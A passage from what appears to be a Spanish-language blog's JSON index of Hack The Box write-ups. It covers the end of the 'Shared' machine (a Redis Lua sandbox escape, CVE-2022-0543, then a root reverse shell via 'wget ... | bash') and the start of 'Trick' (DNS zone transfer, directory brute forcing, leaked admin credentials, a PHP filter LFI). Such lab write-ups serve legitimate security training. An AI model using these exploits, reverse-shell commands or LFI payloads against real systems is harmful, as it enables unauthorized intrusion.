\u0026#39;-u\u0026#39; option on the command line interface may not be safe. 127.0.0.1:6379\u0026gt; keys * (empty array) 127.0.0.1:6379\u0026gt; HackTricks presenta distintas formas de enumerar y explotar redis, una de ellas es LUA Sandbox Bypass donde menciona un CVE con un exploit reciente.\nSi observamos la explotación, carga la librería lua liblua5.1.so.0 y utiliza codigo lua para ejecutar comandos, finalmente utiliza el comando EVAL de redis con el codigo lua.\n1 2 3 4 5 6 7 8 9 [.. snip ..] def shell(ip,port,cmd): lua= \u0026#39;local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); local f = io.popen(\u0026#34;\u0026#39;+cmd+\u0026#39;\u0026#34;, \u0026#34;r\u0026#34;); local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res\u0026#39; r = redis.Redis(host = ip,port = port) script = r.eval(lua,0) print(script) [.. snip ..] El exploit no realiza autenticación con el servidor, agregamos la contraseña de redis al script.\n1 r = redis.Redis(host = ip,port = port, password = \u0026#34;F2WHqJUz2WEz=Gqq\u0026#34;) Obtuvimos el puerto 6379 localmente utilizando SSH, ejecutamos el exploit, logrando asi ejecutar comandos como usuario root.\nFinalmente realizamos la lectura de la flag root.txt.\n1 2 3 4 5 input exec cmd:(q-\u0026gt;exit) \u0026gt;\u0026gt;cat /root/root.txt b\u0026#39;f97e83b9cf276d96bea13e76b9131bd9\\n\u0026#39; input exec cmd:(q-\u0026gt;exit) \u0026gt;\u0026gt; Shell Para obtener una shell ejecutamos shells, y, una shell inversa con el exploit.\n1 \u0026gt;\u0026gt;wget -qO- 10.10.14.207:9090/10.10.14.207:1335 | bash Con ello logramos obtener una shell como usuario root.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/shared ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from shared.htb [10.10.11.172] 38422 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@shared:/var/lib/redis# cd /root root@shared:~# ls c.sh root.txt root@shared:~# cat root.txt f97e83b9cf276d96bea13e76b9131bd9 root@shared:~# ","description":"En Shared descubrimos una vulnerabilidad SQLi en la cookie del sitio web la cual nos permitió acceder a la Base de Datos y a credenciales que posteriormente nos dieron acceso por SSH. Accedimos a un segundo usuario tras la ejecución de un cronjob y un archivo de configuración de iPython. Tras analizar un ejecutable obtuvimos credenciales para Redis, que, finalmente explotamos ganando acceso como usuario privilegiado.","id":12,"section":"posts","tags":["sqli","sqlmap","burpsuite","ipython","ghidra","wireshark","redis","CVE-2022-0543"],"title":"Hack The Box - Shared","uri":"https://sckull.github.io/posts/shared/"},{"content":"\rMultiples vulnerabilidades en el sitio web nos permitieron acceder a archivos locales de la máquina, que, finalmente nos dieron acceso por SSH. Finalmente escalamos privilegios mediante fail2ban.\nNombre Trick OS Linux Puntos 20 Dificultad Facil IP 10.10.11.166 Maker Geiseric\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.8, 5, 5, 5, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: ssh (22), smtp (25), dns (53) y http (80).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Nmap 7.92 scan initiated Wed Jun 29 22:39:22 2022 as: nmap -p22,25,53,80 -sV -sC -oN nmap_scan 10.10.11.166 Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jun 29 22:40:12 2022 -- 1 IP address (1 host up) scanned in 50.06 seconds Web Site Vemos que el servidor es un nginx, no se muestra algun dominio o redirección.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/trick ❯ curl -sI http://10.10.11.166/ HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Thu, 30 Jun 2022 02:40:13 GMT Content-Type: text/html Content-Length: 5480 Last-Modified: Wed, 23 Mar 2022 16:34:04 GMT Connection: keep-alive ETag: \u0026#34;623b4bfc-1568\u0026#34; Accept-Ranges: bytes Únicamente se muestra un formulario para notificaciones por email.\nDirectory Brute Forcing feroxbuster muestra unicamente los recursos (css, javascript) del sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/trick ❯ feroxbuster -u http://10.10.11.166/ -w $MD --depth 1 -x php,html ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.166/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 83l 475w 5480c http://10.10.11.166/index.html 301 GET 7l 12w 185c http://10.10.11.166/assets =\u0026gt; http://10.10.11.166/assets/ 301 GET 7l 12w 185c http://10.10.11.166/css =\u0026gt; http://10.10.11.166/css/ 301 GET 7l 12w 185c http://10.10.11.166/js =\u0026gt; http://10.10.11.166/js/ Virtual Hosts nmap muestra el puerto 53 abierto, utilizando dig y asumiendo que el dominio sigue el patron de las máquinas de htb identificamos dos subdominios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/trick ❯ dig trick.htb @10.10.11.166 axfr ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.0-2-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; trick.htb @10.10.11.166 axfr ;; global options: +cmd trick.htb.\t604800\tIN\tSOA\ttrick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb.\t604800\tIN\tNS\ttrick.htb. trick.htb.\t604800\tIN\tA\t127.0.0.1 trick.htb.\t604800\tIN\tAAAA\t::1 preprod-payroll.trick.htb. 604800 IN\tCNAME\ttrick.htb. trick.htb.\t604800\tIN\tSOA\ttrick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 92 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP) ;; WHEN: Thu Jun 30 20:03:00 EDT 2022 ;; XFR size: 6 records (messages 1, bytes 231) π ~/htb/trick ❯ trick.htb Tiene el mismo contenido que el observado en la dirección IP.\nroot.trick.htb El subdominio root contiene lo mismo que el dominio, un formulario.\nPayroll Preprod-payroll prerpod-payrooll muestra un formulario para un login.\nAdemás el codigo fuente del sitio muestra una solicitudo POST con ajax a la pagina ajax.php, tambien observamos las paginas voting.php y index.php, esta ultima tiene como parametro page y el valor es home, por lo que podría tratarse de una vulnerabilidad LFI.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;script\u0026gt; $(\u0026#39;#login-form\u0026#39;).submit(function(e){ e.preventDefault() $(\u0026#39;#login-form button[type=\u0026#34;button\u0026#34;]\u0026#39;).attr(\u0026#39;disabled\u0026#39;,true).html(\u0026#39;Logging in...\u0026#39;); if($(this).find(\u0026#39;.alert-danger\u0026#39;).length \u0026gt; 0 ) $(this).find(\u0026#39;.alert-danger\u0026#39;).remove(); $.ajax({ url:\u0026#39;ajax.php?action=login\u0026#39;, method:\u0026#39;POST\u0026#39;, data:$(this).serialize(), error:err=\u0026gt;{ console.log(err) $(\u0026#39;#login-form button[type=\u0026#34;button\u0026#34;]\u0026#39;).removeAttr(\u0026#39;disabled\u0026#39;).html(\u0026#39;Login\u0026#39;); }, success:function(resp){ if(resp == 1){ location.href =\u0026#39;index.php?page=home\u0026#39;; }else if(resp == 2){ location.href =\u0026#39;voting.php\u0026#39;; }else{ $(\u0026#39;#login-form\u0026#39;).prepend(\u0026#39;\u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Username or password is incorrect.\u0026lt;/div\u0026gt;\u0026#39;) $(\u0026#39;#login-form button[type=\u0026#34;button\u0026#34;]\u0026#39;).removeAttr(\u0026#39;disabled\u0026#39;).html(\u0026#39;Login\u0026#39;); } } }) }) \u0026lt;/script\u0026gt;\tferoxbuster nos muestra nuevas paginas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 π ~/htb/trick ❯ feroxbuster -u http://preprod-payroll.trick.htb/ -w $MD --depth 1 -x php,html ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://preprod-payroll.trick.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 302 GET 267l 527w 0c http://preprod-payroll.trick.htb/index.php =\u0026gt; login.php 200 GET 177l 313w 0c http://preprod-payroll.trick.htb/login.php 200 GET 45l 100w 0c http://preprod-payroll.trick.htb/header.php 200 GET 81l 141w 0c http://preprod-payroll.trick.htb/users.php 200 GET 27l 31w 0c http://preprod-payroll.trick.htb/home.php 301 GET 7l 12w 185c http://preprod-payroll.trick.htb/assets =\u0026gt; http://preprod-payroll.trick.htb/assets/ 200 GET 0l 0w 0c http://preprod-payroll.trick.htb/ajax.php 301 GET 7l 12w 185c http://preprod-payroll.trick.htb/database =\u0026gt; http://preprod-payroll.trick.htb/database/ 200 GET 23l 84w 0c http://preprod-payroll.trick.htb/navbar.php 200 GET 179l 327w 0c http://preprod-payroll.trick.htb/department.php 200 GET 20l 42w 0c http://preprod-payroll.trick.htb/topbar.php 200 GET 196l 363w 0c http://preprod-payroll.trick.htb/position.php 200 GET 95l 155w 0c http://preprod-payroll.trick.htb/employee.php Al no tener credenciales o acceso al sitio visitamos y observamos el codigo de cada una de las páginas que feroxbuster encontró, users.php muestra nombre y usuario, también se muestran algunas acciones como editar y eliminar.\nEn el codigo fuente se observa distintas solicitudes segun la acción, para nuevo usuario y editar usuario vemos que redirige a la pagina manage_user.php segun la acción se envia el id de usuario, finalmente para eliminar un usuario realiza una solicitud POST hacia ajax.php con el id del usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;script\u0026gt;\t$(\u0026#39;#new_user\u0026#39;).click(function(){ uni_modal(\u0026#39;New User\u0026#39;,\u0026#39;manage_user.php\u0026#39;) }) $(\u0026#39;.edit_user\u0026#39;).click(function(){ uni_modal(\u0026#39;Edit User\u0026#39;,\u0026#39;manage_user.php?id=\u0026#39;+$(this).attr(\u0026#39;data-id\u0026#39;)) }) $(\u0026#39;.delete_user\u0026#39;).click(function(){ _conf(\u0026#34;Are you sure to delete this user?\u0026#34;,\u0026#34;delete_user\u0026#34;,[$(this).attr(\u0026#39;data-id\u0026#39;)]) }) function delete_user($id){ start_load() $.ajax({ url:\u0026#39;ajax.php?action=delete_user\u0026#39;, method:\u0026#39;POST\u0026#39;, data:{id:$id}, success:function(resp){ if(resp==1){ alert_toast(\u0026#34;Data successfully deleted\u0026#34;,\u0026#39;success\u0026#39;) setTimeout(function(){ location.reload() },1500) } } }) } \u0026lt;/script\u0026gt; Creds manage_users.php muestra unicamente un formulario, en el codigo fuente se muestra una solicitud para ajax.php con los datos del formulario para crear un usuario.\nComo sabemos es posible pasarle un id a la pagina para editar un usuario, observamos que el usuario con id 1 es el Administrador, el formulario contiene la contraseña, tras cambiar el tipo de input logramos obtener la contraseña.\nEjecutamos ffuf con una lista de ids para verificar la existencia de algun otro usuario, unicamente encontramos el id del administrador.\nffuf\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/trick ❯ python -c \u0026#39;for i in range(1,100): print(i)\u0026#39; \u0026gt; user_ids.txt π ~/htb/trick ❯ ffuf -c -w user_ids.txt -u \u0026#34;http://preprod-payroll.trick.htb/manage_user.php?id=FUZZ\u0026#34; -fs 1259 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://preprod-payroll.trick.htb/manage_user.php?id=FUZZ :: Wordlist : FUZZ: user_ids.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 1259 ________________________________________________ 1 [Status: 200, Size: 1312, Words: 44, Lines: 44] :: Progress: [99/99] :: Job [1/1] :: 56 req/sec :: Duration: [0:00:01] :: Errors: 0 :: π ~/htb/trick ❯ Creds:\n1 Enemigosss : SuperGucciRainbowCake Payroll - LFI Tras ingresar con las credenciales vemos información sobre empleados, pagos, departamentos, etc. Vemos que al visitar cada pagina el valor del parametro de index cambia index.php?page=[pagina].\nUtilizando un wrapper de PHP logramos obtener el codigo fuente del index. Observamos en el codigo que utiliza include segun el valor que se pase, al final agrega la extensión php, por lo que solo podriamos acceder a paginas con esta extension.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 // wrapper ---\u0026gt; php://filter/convert.base64-encode/resource=index //index.php \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; name=\u0026#34;viewport\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Admin | Employee\u0026#39;s Payroll Management System\u0026lt;/title\u0026gt; \u0026lt;?php session_start(); if(!isset($_SESSION[\u0026#39;login_id\u0026#39;])) header(\u0026#39;location:login.php\u0026#39;); include(\u0026#39;./header.php\u0026#39;); // include(\u0026#39;./auth.php\u0026#39;); ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;style\u0026gt; body{ background: #80808045; } .modal-dialog.large { width: 80% !important; max-width: unset; } .modal-dialog.mid-large { width: 50% !important; max-width: unset; } div#confirm_modal { z-index: 9991; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php include \u0026#39;topbar.php\u0026#39; ?\u0026gt; \u0026lt;?php include \u0026#39;navbar.php\u0026#39; ?\u0026gt; \u0026lt;div class=\u0026#34;toast\u0026#34; id=\u0026#34;alert_toast\u0026#34; role=\u0026#34;alert\u0026#34; aria-live=\u0026#34;assertive\u0026#34; aria-atomic=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;toast-body text-white\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;main id=\u0026#34;view-panel\u0026#34; \u0026gt; \u0026lt;?php $page = isset($_GET[\u0026#39;page\u0026#39;]) ? $_GET[\u0026#39;page\u0026#39;] :\u0026#39;home\u0026#39;; ?\u0026gt; \u0026lt;?php include $page.\u0026#39;.php\u0026#39; ?\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;div id=\u0026#34;preloader\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;back-to-top\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;icofont-simple-up\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;confirm_modal\u0026#34; role=\u0026#39;dialog\u0026#39;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog modal-md\u0026#34; role=\u0026#34;document\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;modal-title\u0026#34;\u0026gt;Confirmation\u0026lt;/h5\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;delete_content\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary\u0026#34; id=\u0026#39;confirm\u0026#39; onclick=\u0026#34;\u0026#34;\u0026gt;Continue\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-secondary\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;Close\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;uni_modal\u0026#34; role=\u0026#39;dialog\u0026#39;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog modal-md\u0026#34; role=\u0026#34;document\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;modal-title\u0026#34;\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary\u0026#34; id=\u0026#39;submit\u0026#39; onclick=\u0026#34;$(\u0026#39;#uni_modal form\u0026#39;).submit()\u0026#34;\u0026gt;Save\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-secondary\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;Cancel\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; window.start_load = function(){ $(\u0026#39;body\u0026#39;).prepend(\u0026#39;\u0026lt;di id=\u0026#34;preloader2\u0026#34;\u0026gt;\u0026lt;/di\u0026gt;\u0026#39;) } window.end_load = function(){ $(\u0026#39;#preloader2\u0026#39;).fadeOut(\u0026#39;fast\u0026#39;, function() { $(this).remove(); }) } window.uni_modal = function($title = \u0026#39;\u0026#39; , $url=\u0026#39;\u0026#39;,$size=\u0026#34;\u0026#34;){ start_load() $.ajax({ url:$url, error:err=\u0026gt;{ console.log() alert(\u0026#34;An error occured\u0026#34;) }, success:function(resp){ if(resp){ $(\u0026#39;#uni_modal .modal-title\u0026#39;).html($title) $(\u0026#39;#uni_modal .modal-body\u0026#39;).html(resp) if($size != \u0026#39;\u0026#39;){ $(\u0026#39;#uni_modal .modal-dialog\u0026#39;).addClass($size) }else{ $(\u0026#39;#uni_modal .modal-dialog\u0026#39;).removeAttr(\u0026#34;class\u0026#34;).addClass(\u0026#34;modal-dialog modal-md\u0026#34;) } $(\u0026#39;#uni_modal\u0026#39;).modal({ show:true, backdrop:\u0026#39;static\u0026#39;, keyboard:false, focus:true }) end_load() } } }) } window._conf = function($msg=\u0026#39;\u0026#39;,$func=\u0026#39;\u0026#39;,$params = []){ $(\u0026#39;#confirm_modal #confirm\u0026#39;).attr(\u0026#39;onclick\u0026#39;,$func+\u0026#34;(\u0026#34;+$params.join(\u0026#39;,\u0026#39;)+\u0026#34;)\u0026#34;) $(\u0026#39;#confirm_modal .modal-body\u0026#39;).html($msg) $(\u0026#39;#confirm_modal\u0026#39;).modal({ show:true, backdrop:\u0026#39;static\u0026#39;, keyboard:false, focus:true }) } window.alert_toast= function($msg = \u0026#39;TEST\u0026#39;,$bg = \u0026#39;success\u0026#39;){ $(\u0026#39;#alert_toast\u0026#39;).removeClass(\u0026#39;bg-success\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).removeClass(\u0026#39;bg-danger\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).removeClass(\u0026#39;bg-info\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).removeClass(\u0026#39;bg-warning\u0026#39;) if($bg == \u0026#39;success\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).addClass(\u0026#39;bg-success\u0026#39;) if($bg == \u0026#39;danger\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).addClass(\u0026#39;bg-danger\u0026#39;) if($bg == \u0026#39;info\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).addClass(\u0026#39;bg-info\u0026#39;) if($bg == \u0026#39;warning\u0026#39;) $(\u0026#39;#alert_toast\u0026#39;).addClass(\u0026#39;bg-warning\u0026#39;) $(\u0026#39;#alert_toast .toast-body\u0026#39;).html($msg) $(\u0026#39;#alert_toast\u0026#39;).toast({delay:3000}).toast(\u0026#39;show\u0026#39;); } $(document).ready(function(){ $(\u0026#39;#preloader\u0026#39;).fadeOut(\u0026#39;fast\u0026#39;, function() { $(this).remove(); }) }) $(\u0026#39;.datetimepicker\u0026#39;).datetimepicker({ format:\u0026#39;Y/m/d H:i\u0026#39;, startDate: \u0026#39;+3d\u0026#39; }) $(\u0026#39;.select2\u0026#39;).select2({ placeholder:\u0026#34;Please select here\u0026#34;, width: \u0026#34;100%\u0026#34; }) \u0026lt;/script\u0026gt;\t\u0026lt;/html\u0026gt; Tambien obtuvimos el codigo fuente de otras páginas, entre ellas la conexion de la base de datos con las credenciales.\nusers.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 //users \u0026lt;?php ?\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-lg-12\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary float-right btn-sm\u0026#34; id=\u0026#34;new_user\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-plus\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; New user\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card col-lg-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;table class=\u0026#34;table-striped table-bordered col-md-12\u0026#34;\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th class=\u0026#34;text-center\u0026#34;\u0026gt;#\u0026lt;/th\u0026gt; \u0026lt;th class=\u0026#34;text-center\u0026#34;\u0026gt;Name\u0026lt;/th\u0026gt; \u0026lt;th class=\u0026#34;text-center\u0026#34;\u0026gt;Username\u0026lt;/th\u0026gt; \u0026lt;th class=\u0026#34;text-center\u0026#34;\u0026gt;Action\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;?php include \u0026#39;db_connect.php\u0026#39;; $users = $conn-\u0026gt;query(\u0026#34;SELECT * FROM users order by name asc\u0026#34;); $i = 1; while($row= $users-\u0026gt;fetch_assoc()): ?\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;?php echo $i++ ?\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt; \u0026lt;?php echo $row[\u0026#39;name\u0026#39;] ?\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt; \u0026lt;?php echo $row[\u0026#39;username\u0026#39;] ?\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div class=\u0026#34;btn-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Action\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary dropdown-toggle dropdown-toggle-split\u0026#34; data-toggle=\u0026#34;dropdown\u0026#34; aria-haspopup=\u0026#34;true\u0026#34; aria-expanded=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;Toggle Dropdown\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;dropdown-menu\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;dropdown-item edit_user\u0026#34; href=\u0026#34;javascript:void(0)\u0026#34; data-id = \u0026#39;\u0026lt;?php echo $row[\u0026#39;id\u0026#39;] ?\u0026gt;\u0026#39;\u0026gt;Edit\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;dropdown-divider\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;a 